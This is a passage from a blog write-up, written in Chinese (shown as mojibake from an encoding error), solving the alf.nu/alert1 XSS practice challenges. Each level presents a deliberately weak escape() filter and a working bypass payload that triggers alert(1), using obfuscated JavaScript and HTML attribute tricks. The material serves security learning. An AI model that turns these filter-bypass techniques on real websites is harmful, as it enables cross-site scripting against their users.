·JSå¼•æ“å°±ä¼šå»è®¡ç®—æˆ‘ä»¬çš„å¯¹è±¡çš„å€¼ï¼Œæ€ä¹ˆè®¡ç®—å‘¢ï¼Ÿå°±æ˜¯è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„<code>valueOf</code>æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬å°†valueOfæ–¹æ³•å®šä¹‰ä¸ºé¢˜ç›®ä¸­çš„<code>the_easy_but_expenssive_way_out</code>ï¼Œï¼Œå°±å¯ä»¥è§¦å‘alertå‡½æ•°äº†ï¼Œä½†æ˜¯ç”±äºæ˜¯alert(i++)ï¼Œiä»0å¼€å§‹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è°ƒç”¨ä¸¤æ¬¡ã€‚<br>solution(103): <code>{&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]}+0,{&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]}</code><br>éœ€è¦æé†’çš„æ˜¯ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”±<code>eval</code>è°ƒç”¨ï¼Œç¬¬äºŒæ¬¡æ˜¯ç”±<code>console.log</code>è°ƒç”¨ã€‚<br><br><br><br><br></p>
<h1 id="Brunn"><a href="#Brunn" class="headerlink" title="Brunn"></a>Brunn</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  http:<span class="comment">//www.avlidienbrunn.se/xsschallenge/</span></span><br><span class="line"></span><br><span class="line">  s = s.replace(<span class="regexp">/[\r\n\u2028\u2029\\;,()\[\]&lt;]/g</span>, <span class="string">''</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt; var email = '"</span> + s + <span class="string">"'; &lt;\/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†å·å°–æ‹¬å·éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥æ™®é€šçš„åŠæ³•æ˜¯æ— æ•ˆçš„ã€‚ä½†æ˜¯ä¸Šä¸€é¢˜çš„æ–¹æ³•è¿˜æ˜¯æœ‰ç”¨ã€‚<br>æ‰€ä»¥åº”è¯¥æ„é€ çš„payloadæ˜¯ï¼š<br><code>&#39;+{valueOf:Function(&#39;alert(1)&#39;)}//</code><br>æˆ–è€…<code>&#39;+{valueOf:function(){alert(1)}}//</code><br>æˆ–è€…<code>&#39;+{valueOf:()=&gt;{alert(1)}}//</code><br>æˆ–è€…<code>&#39;+{valueOf:a=&gt;{alert(1)}}//</code><br>ä½†æ˜¯æœ‰æ–°çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸èƒ½ä½¿ç”¨å°æ‹¬å·å’Œä¸­æ‹¬å·ã€‚<br>å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ç”¨<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_template_literals" target="_blank" rel="noopener">Tag Function</a>æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚<br>solution(85):</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+&#123;valueOf:Function`a$&#123;'</span>alert<span class="string">'+String.fromCharCode`40`+1+String.fromCharCode`41`&#125;`&#125;//</span></span><br></pre></td></tr></table></figure>

<p><br><br><br><br></p>
<h1 id="No"><a href="#No" class="headerlink" title="No"></a>No</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    s = s.replace(<span class="regexp">/[()`&lt;]/g</span>, <span class="string">''</span>); <span class="comment">// no function calls</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;\n'</span> +</span><br><span class="line">           <span class="string">'var string = "'</span> + s + <span class="string">'";\n'</span> +</span><br><span class="line">           <span class="string">'console.log(string);\n'</span> +</span><br><span class="line">           <span class="string">'&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒèµ„æ–™ï¼š<a href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/" target="_blank" rel="noopener">XSS technique without parentheses</a><br>solution(39): <code>&quot;;onerror=eval;throw&#39;=alert\x281\x29&#39;//</code><br><br><br><br><br></p>
<h1 id="Kâ€™Zâ€™K"><a href="#Kâ€™Zâ€™K" class="headerlink" title="Kâ€™Zâ€™K"></a>Kâ€™Zâ€™K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels in honor of K'Z'K the Destroyer</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]/gi</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé¢˜è¦ç”¨çš„åŠæ³•è¿˜æ˜¯å’Œé¢˜ç›®ä¸€æ ·Skandia ][]ï¼Œä½†æ˜¯ä¸ç”¨å…¨éƒ¨éƒ½ç”¨å…«è¿›åˆ¶æ¥æ›¿æ¢ï¼Œåªè¦æ›¿æ¢æ‰å…ƒéŸ³å­—æ¯å°±å¯ä»¥äº†ã€‚<br>solution(60):  <code>&quot;,[][&quot;p\x6fp&quot;][&quot;c\x6fnstr\x75ct\x6fr&quot;](&#39;\x61l\x65rt(1)&#39;)(),&quot;</code></p>
<p><br><br><br><br></p>
<h1 id="Kâ€™Zâ€™K-1"><a href="#Kâ€™Zâ€™K-1" class="headerlink" title="Kâ€™Zâ€™K"></a>Kâ€™Zâ€™K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels and escape sequences in honor of K'Z'K </span></span><br><span class="line">    <span class="comment">// y is only sometimes a vowel, so it's only removed as a literal</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="comment">// remove certain characters that can be used to get vowels</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[&#123;&#125;!=&lt;&gt;]/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜æœ‰ä¸ªæ­£åˆ™æ›¿æ¢ï¼Œå°†æˆ‘ä»¬çš„å…«è¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶éƒ½ç»™æ›¿æ¢æˆç©ºäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šä¸€é¢˜çš„åšæ³•å’Œé¢˜ç›®JSON ][çš„æ–¹æ³•å°±å¯ä»¥äº†ã€‚<br>solution(85): <code>&quot;);[][&quot;p\x\x6f6fp&quot;][&quot;c\x\x6f6fnstr\x\x7575ct\x\x6f6fr&quot;](&#39;\x\x6161l\x\x6565rt(1)&#39;)()//</code></p>
<p><br><br><br><br></p>
<h1 id="Kâ€™Zâ€™K-2"><a href="#Kâ€™Zâ€™K-2" class="headerlink" title="Kâ€™Zâ€™K"></a>Kâ€™Zâ€™K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels in honor of K'Z'K the Destroyer</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]/gi</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// remove certain characters that can be used to get vowels</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[&#123;&#125;!=&lt;&gt;\\]/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å¤æ‚ä¸€ç‚¹ï¼Œæ²¡æƒ³åˆ°å¥½åŠæ³•ã€‚æ‰€ä»¥è¿˜æ˜¯ç”¨è€åŠæ³•ã€‚<br>solution(190): </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");[]['m'+(++[][[]]+[])[1]+'p']['c'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'nstr'+([][[]]+[])[0]+'ct'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'r']((++[][[]]+[])[1]+'l'+([][[]]+[])[3]+'rt(1)')()//</span></span><br></pre></td></tr></table></figure>

<p><br><br><br><br></p>
<h1 id="Fruit-1"><a href="#Fruit-1" class="headerlink" title="Fruit 1"></a>Fruit 1</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'SCRIPT'</span> === n.tagName) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé¢˜ç›®çš„æ¼æ´æ¥æºäºä»£ç çš„é€»è¾‘ä¸ä¸¥è°¨ã€‚<br>å…³é”®åœ¨äºç¬¬6è¡Œä¸­çš„<code>i&lt;n.attributes.length</code>ï¼Œä½†æ˜¯è¿™ä¸ªlengthæ˜¯åŠ¨æ€å˜åŒ–çš„ï¼Œå¯¼è‡´å¦‚æœæœ‰å¤šä¸ªå±æ€§çš„æ—¶å€™ï¼Œå°±è¿˜å‰©ä¸‹ä¸€ä¸ªå±æ€§æ˜¯åˆ ä¸æ‰äº†ã€‚<br>è¿™æ ·çš„è¯æˆ‘ä»¬å°±æ„é€ å¤šä¸ªå±æ€§å¥½äº†ï¼Œå°†<code>onload=alert(1)</code>æ”¾åé¢ã€‚<br>solution(26): <code>&lt;iframe t onload=alert(1)&gt;</code></p>
<p><br><br><br><br></p>
<h1 id="Fruit-2"><a href="#Fruit-2" class="headerlink" title="Fruit 2"></a>Fruit 2</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/script/i</span>.test(n.tagName)) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€é¢˜æ”¹å˜äº†ç¬¬äº”è¡Œçš„ifè¯­å¥ï¼Œçœ‹ä¸å‡ºæ¥ä¼šå¸¦æ¥ä»€ä¹ˆä¸åŒçš„å½±å“ã€‚<br>è‡³å°‘å¯¹äºæˆ‘ä¸Šä¸€é¢˜çš„è§£æ³•æ²¡å½±å“ï¼Œæ‰€ä»¥ç”¨åŒæ ·çš„æ–¹æ³•å°±å¯ä»¥ã€‚<br><br><br><br><br></p>
<h1 id="Fruit-3"><a href="#Fruit-3" class="headerlink" title="Fruit 3"></a>Fruit 3</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/script/i</span>.test(n.tagName)) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); i--; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸ä¼šã€‚<br><br><br><br><br></p>
<h1 id="Quine"><a href="#Quine" class="headerlink" title="Quine"></a>Quine</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Somebody</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// We've got a quine level in all of the other</span></span><br><span class="line">    <span class="comment">// games, so why not have one here?</span></span><br><span class="line">    <span class="keyword">var</span> win = alert;</span><br><span class="line">    <span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (t === s)</span><br><span class="line">            win(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Alert: "</span> + t + <span class="string">"\n(That's not a quine)"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å¾ˆæœ‰æ„æ€ã€‚å¯æƒœæˆ‘ä¸ä¼šå•Šã€‚<br><br><br><br><br><br>å‚è€ƒ<a href="http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/" target="_blank" rel="noopener">åšå®¢-ä¸Š</a></p>
<p>å‚è€ƒ<a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/" target="_blank" rel="noopener">åšå®¢-ä¸‹</a></p>

      </div>
      <footer class="post-footer">
        
        <nav class="post-nav"><a class="prev" href="/2018/02/08/sqli-labsæŒ‘æˆ˜è®°å½•/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">sqli-labsæŒ‘æˆ˜è®°å½•</span>
        <span class="prev-text nav-mobile">ä¸Šä¸€ç¯‡</span>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"><div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:cxliker@qq.com" class="iconfont icon-email" title="email"></a>
        <a href="https://github.com/cxliker" class="iconfont icon-github" title="github"></a>
        <a href="https://cxliker.github.io/rss" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    ç”± <a class="hexo-link" href="https://hexo.io/">Hexo</a> å¼ºåŠ›é©±åŠ¨
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    ä¸»é¢˜ - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2018 - 2019<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">danta</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'https://cxliker.github.io/2018/01/29/XSSç»ƒä¹ -alf-nu-alert1-Write-ups/';
        this.page.identifier = '2018/01/29/XSSç»ƒä¹ -alf-nu-alert1-Write-ups/';
        this.page.title = 'XSSç»ƒä¹ :alf.nu/alert1 Write-ups';
    };
    (function() {
    var d = document, s = d.createElement('script');

    s.src = '//cxliker.disqus.com/embed.js';

    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();  
  </script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.1"></script>
</body>
</html>
